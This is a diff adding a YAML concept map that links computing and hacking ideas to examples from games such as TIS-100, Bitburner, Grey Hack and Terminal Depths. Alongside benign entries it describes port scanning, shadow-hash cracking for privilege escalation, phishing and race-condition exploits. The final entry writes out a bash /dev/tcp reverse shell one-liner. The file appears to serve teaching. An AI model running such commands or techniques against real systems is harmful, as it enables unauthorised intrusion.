@@ -1,0 +1,194 @@
+concepts:
+
+  - name: parallel processing
+    id: parallel_processing
+    description: >
+      Executing multiple operations simultaneously to increase throughput.
+      Contrasted with sequential processing where operations happen one at a time.
+    prerequisites: []
+    related:
+      - script scheduling
+      - resource management
+      - pipeline architecture
+    difficulty: intermediate
+    examples:
+      - "TIS-100: multiple nodes processing simultaneously"
+      - "Bitburner: ns.run() spawning multiple hack scripts"
+      - "Colony: 71 agents working in parallel"
+
+  - name: port scanning
+    id: port_scanning
+    description: >
+      Probing a networked system to discover which ports are open and what
+      services are listening on them. The foundation of network reconnaissance.
+    prerequisites: []
+    related:
+      - service fingerprinting
+      - attack surface mapping
+      - nmap
+    difficulty: beginner
+    examples:
+      - "Grey Hack: nmap <IP> to discover open ports"
+      - "Terminal Depths: nmap command — same syntax as real nmap"
+
+  - name: privilege escalation
+    id: privilege_escalation
+    description: >
+      Gaining higher system permissions than currently assigned, typically
+      from user-level to root/admin. The core goal of most hacking engagements.
+    prerequisites:
+      - port scanning
+      - exploit selection
+    related:
+      - lateral movement
+      - credential cracking
+      - SUID exploitation
+    difficulty: intermediate
+    examples:
+      - "Grey Hack: cracking /etc/shadow hashes to get root"
+      - "Terminal Depths: sudo path after gaining initial shell"
+
+  - name: social engineering
+    id: social_engineering
+    description: >
+      Manipulating humans rather than systems to gain access or information.
+      Often more effective than technical attacks.
+    prerequisites: []
+    related:
+      - phishing
+      - impersonation
+      - pretext construction
+    difficulty: intermediate
+    examples:
+      - "Grey Hack: sending phishing emails to employees"
+      - "Terminal Depths: talk command — build NPC trust to extract credentials"
+
+  - name: assembly optimization
+    id: assembly_optimization
+    description: >
+      Reducing the number of instructions, cycles, or registers used in
+      assembly-level code to maximize efficiency.
+    prerequisites:
+      - register management
+      - instruction set architecture
+    related:
+      - pipeline architecture
+      - lookup tables
+      - cycle counting
+    difficulty: advanced
+    examples:
+      - "TIS-100: MOV UP, DOWN — 1-instruction pass-through"
+      - "Shenzhen I/O: `teq` instead of branch to save 2 cycles"
+
+  - name: batch hacking
+    id: batch_hacking
+    description: >
+      Running multiple exploitation scripts simultaneously against different targets
+      to maximize income per time unit. The fundamental Bitburner meta-technique.
+    prerequisites:
+      - parallel processing
+      - script scheduling
+    related:
+      - resource management
+      - thread allocation
+      - hack/grow/weaken cycle
+    difficulty: intermediate
+    examples:
+      - "Bitburner: ns.run() loop targeting multiple servers"
+      - "Terminal Depths: script run batch_hack.py"
+
+  - name: pipeline architecture
+    id: pipeline_architecture
+    description: >
+      Arranging computation as a series of stages where output of one stage
+      feeds directly into the next, allowing stages to run simultaneously.
+    prerequisites:
+      - parallel processing
+    related:
+      - throughput optimization
+      - node communication
+      - data flow
+    difficulty: intermediate
+    examples:
+      - "TIS-100: reader → transform → writer node chain"
+      - "Colony: Gordon → Serena → Memory Palace pipeline"
+      - "Content Scheduler: generate → validate → store → push"
+
+  - name: race conditions
+    id: race_conditions
+    description: >
+      A vulnerability or technique exploiting timing windows where a system
+      transitions between states, creating a brief moment of inconsistency.
+    prerequisites:
+      - timing attacks
+    related:
+      - timing attacks
+      - filesystem vulnerabilities
+      - synchronization
+    difficulty: advanced
+    examples:
+      - "Hacknet Quasar Skip: delete files during PortHack's 2.5s window"
+      - "Real world: TOCTOU (Time-of-Check-Time-of-Use) vulnerabilities"
+
+  - name: cost-benefit analysis
+    id: cost_benefit_analysis
+    description: >
+      Evaluating which action provides the most return for the least investment.
+      The backbone of efficient game progression and real-world resource allocation.
+    prerequisites: []
+    related:
+      - opportunity cost
+      - greedy algorithms
+      - priority queuing
+    difficulty: beginner
+    examples:
+      - "Bitburner: compare new node vs. level/RAM/core upgrade ROI"
+      - "Colony: LLM call cost vs. cached result reuse"
+
+  - name: moving averages
+    id: moving_averages
+    description: >
+      A statistical technique that smooths time-series data by computing the
+      average of a sliding window, revealing trends through noise.
+    prerequisites: []
+    related:
+      - algorithmic trading
+      - signal detection
+      - trend following
+    difficulty: intermediate
+    examples:
+      - "Bitburner: 5-tick MA vs. 20-tick MA crossover for stock signals"
+      - "Real world: trading bots, IoT sensor smoothing, performance metrics"
+
+  - name: lookup tables
+    id: lookup_tables
+    description: >
+      Pre-computing results and storing them in a table for O(1) retrieval,
+      trading memory for computation time.
+    prerequisites: []
+    related:
+      - opcode parsing
+      - cycle optimization
+      - memoization
+    difficulty: beginner
+    examples:
+      - "TIS-100: memory nodes as fast lookup tables"
+      - "EmuDevz: 256-entry opcode dispatch table"
+      - "LLM cache: precomputed responses for repeated prompts"
+
+  - name: reverse shell
+    id: reverse_shell
+    description: >
+      A shell session where the target machine initiates the connection back to
+      the attacker, bypassing inbound firewall rules.
+    prerequisites:
+      - port scanning
+      - network topology
+    related:
+      - firewall bypass
+      - persistence
+      - netcat
+    difficulty: advanced
+    examples:
+      - "Grey Hack: bash -i >& /dev/tcp/IP/PORT 0>&1"
+      - "Real world: meterpreter reverse TCP payload"
